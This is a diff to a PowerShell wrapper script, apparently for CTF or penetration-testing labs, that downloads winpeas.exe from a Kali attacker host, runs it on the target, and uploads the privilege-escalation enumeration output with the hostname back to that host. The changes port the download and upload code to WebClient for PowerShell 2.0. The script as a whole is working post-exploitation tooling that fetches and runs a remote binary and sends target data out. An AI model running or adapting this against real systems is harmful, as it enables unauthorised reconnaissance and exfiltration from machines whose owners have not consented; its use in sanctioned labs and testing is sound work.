@@ -1,6 +1,7 @@
 # ParsingPeas Wrapper Script (PowerShell)
 # Runs winpeas and automatically sends output to Kali host
 # NOTE: Downloads scripts from Kali host (for isolated CTF environments)
+# Compatible with PowerShell 2.0+
 
 param(
     [string]$ServerUrl = "KALI_SERVER_URL"  # Will be replaced by receiver.py
@@ -26,11 +27,11 @@ $ScriptPath = "$env:TEMP\winpeas.exe"
 
 Write-Host "[*] Downloading $ScanType from Kali host..." -ForegroundColor Yellow
 
-# Download script from Kali host (NOT from internet!)
+# Download script from Kali host using WebClient (PowerShell 2.0+ compatible)
 try {
-    $ProgressPreference = 'SilentlyContinue'  # Disable progress bar for faster download
-    Invoke-WebRequest -Uri $ScriptEndpoint -OutFile $ScriptPath -TimeoutSec 30 -UseBasicParsing
-    $ProgressPreference = 'Continue'
+    $WebClient = New-Object System.Net.WebClient
+    $WebClient.DownloadFile($ScriptEndpoint, $ScriptPath)
+    $WebClient.Dispose()
 } catch {
     Write-Host "[!] Download failed: $_" -ForegroundColor Red
     exit 1
@@ -72,7 +73,7 @@ try {
     # Combine output and errors
     $FullOutput = $Output
     if ($ErrorOutput) {
-        $FullOutput += "`n`n=== STDERR ===/`n" + $ErrorOutput
+        $FullOutput += "`n`n=== STDERR ===`n" + $ErrorOutput
     }
     
     # Save to temp file
@@ -103,7 +104,7 @@ Write-Host ""
 Write-Host "[*] Transferring to Kali host..." -ForegroundColor Yellow
 Write-Host ""
 
-# Send to Kali with retry logic
+# Send to Kali with retry logic using WebClient (PowerShell 2.0+ compatible)
 $MaxRetries = 3
 $RetryCount = 0
 $Success = $false
@@ -112,37 +113,33 @@ while ($RetryCount -lt $MaxRetries -and -not $Success) {
     Write-Host "[*] Upload attempt $($RetryCount + 1)/$MaxRetries" -ForegroundColor Yellow
     
     try {
-        $Headers = @{
-            "X-Session-ID" = $SessionId
-            "X-Hostname" = $Hostname
-            "X-Scan-Type" = $ScanType
-            "Content-Type" = "text/plain"
-        }
+        $WebClient = New-Object System.Net.WebClient
+        $WebClient.Headers.Add("X-Session-ID", $SessionId)
+        $WebClient.Headers.Add("X-Hostname", $Hostname)
+        $WebClient.Headers.Add("X-Scan-Type", $ScanType)
+        $WebClient.Headers.Add("Content-Type", "text/plain")
         
         $FileBytes = [System.IO.File]::ReadAllBytes($TmpOutput)
         
-        $Response = Invoke-WebRequest -Uri "$ServerUrl/upload" `
-            -Method POST `
-            -Headers $Headers `
-            -Body $FileBytes `
-            -TimeoutSec 120 `
-            -UseBasicParsing
+        $ResponseBytes = $WebClient.UploadData("$ServerUrl/upload", "POST", $FileBytes)
+        $ResponseText = [System.Text.Encoding]::UTF8.GetString($ResponseBytes)
         
-        if ($Response.StatusCode -eq 200) {
-            Write-Host "[+] Transfer successful!" -ForegroundColor Green
-            
-            # Try to extract report URL from response
-            try {
-                $ResponseJson = $Response.Content | ConvertFrom-Json
-                if ($ResponseJson.report_url) {
-                    Write-Host "[+] View report at: $ServerUrl$($ResponseJson.report_url)" -ForegroundColor Green
-                }
-            } catch {
-                # Ignore JSON parse errors
+        Write-Host "[+] Transfer successful!" -ForegroundColor Green
+        
+        # Try to extract report URL from response
+        try {
+            # Simple regex to extract report_url from JSON (no ConvertFrom-Json in PS 2.0)
+            if ($ResponseText -match '"report_url"\s*:\s*"([^"]+)"') {
+                $ReportUrl = $matches[1]
+                Write-Host "[+] View report at: $ServerUrl$ReportUrl" -ForegroundColor Green
             }
-            
-            $Success = $true
+        } catch {
+            # Ignore parse errors
         }
+        
+        $WebClient.Dispose()
+        $Success = $true
+        
     } catch {
         $RetryCount++
         Write-Host "[!] Transfer failed: $_" -ForegroundColor Red
@@ -162,7 +159,6 @@ if ($Success) {
 } else {
     Write-Host "[!] Transfer failed after $MaxRetries attempts" -ForegroundColor Red
     Write-Host "[*] Output saved locally at: $TmpOutput" -ForegroundColor Yellow
-    Write-Host "[*] You can manually transfer with:" -ForegroundColor Yellow
-    Write-Host "    Invoke-WebRequest -Uri '$ServerUrl/upload' -Method POST -InFile '$TmpOutput' -Headers @{'X-Hostname'='$Hostname'}" -ForegroundColor Yellow
+    Write-Host "[*] You can manually transfer the file" -ForegroundColor Yellow
     exit 1
 }
